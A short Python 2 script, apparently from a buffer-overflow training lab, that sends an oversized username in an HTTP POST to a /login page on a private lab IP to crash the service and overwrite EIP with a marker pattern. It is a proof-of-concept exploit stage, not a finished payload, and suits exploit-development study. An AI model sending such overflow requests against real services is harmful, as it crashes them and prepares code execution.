#!/bin/python
# A script to replicate the crash of the application with HTTP requests

import socket

try:
    print "\nSending Evil Buffer..."
    
    # Creates the Buffer 

    filler = "A" * 780
    eip = "B" * 4
    buffer = "C" * 16


    # Creates the web request 
    input_buffer = filler + eip + buffer

    content = "username=" + input_buffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.193.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
    buffer += "Accept: text/html,application/xhmtl+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: En-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Referer: http://192.168.193.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    # makes the connection to the web app 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.193.10", 80))
    s.send(buffer)

    s.close()

    print "\nDone!"

except:
    print "\nCould not connect!"




